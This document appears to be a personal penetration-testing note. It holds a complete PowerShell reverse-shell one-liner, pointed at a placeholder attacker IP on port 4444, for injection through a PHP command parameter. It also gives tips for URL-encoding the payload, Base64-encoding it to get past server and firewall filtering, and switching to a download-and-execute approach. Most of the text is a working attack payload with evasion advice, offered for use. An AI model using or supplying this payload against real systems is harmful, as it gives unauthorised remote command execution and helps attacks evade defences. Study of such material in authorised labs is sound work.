

revshell for inserting into php cmd

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient(' < KALI-IP > ',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendword = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendword);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

if entering into URL

need to encode it

### CyberChef (The "Cyber Swiss Army Knife")

**CyberChef** is the gold standard for this. It is reliable and handles large blocks of text perfectly without adding weird line breaks.

- **The Recipe:** Search for the **"URL Encode"** operation and drag it to the Recipe column.
    
- **Tip:** If you are pasting this into a web shell's URL parameter (like `?cmd=...`), make sure to select the **"All special characters"** option in the URL Encode settings to ensure every symbol is safely escaped.
    
- **Link:** [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef/)


### The "PowerShell Way" (Base64 Bypass)

If the URL encoding still feels "messy" or characters are being stripped by the server, you can bypass URL issues entirely by using **Base64 encoding**. This is a classic "pro" technique.

1. Take your PowerShell script and encode the whole thing into Base64 (UTF-16LE).
    
2. Run it using the `-EncodedCommand` (or `-e`) flag.
    

**Example format:** `powershell -e [Base64_String_Here]`

> **Why this works:** Base64 only uses letters, numbers, and `+`, `/`, `=`. It is much harder for a web server or a firewall to "break" a Base64 string than a complex URL-encoded string.

------

note: above method is prone to 
web server (Apache/PHP) truncating or mangling the string because it's simply too long for a URL

------
Download-and-Execute method
is more reliable

see 
powershell reverse shell script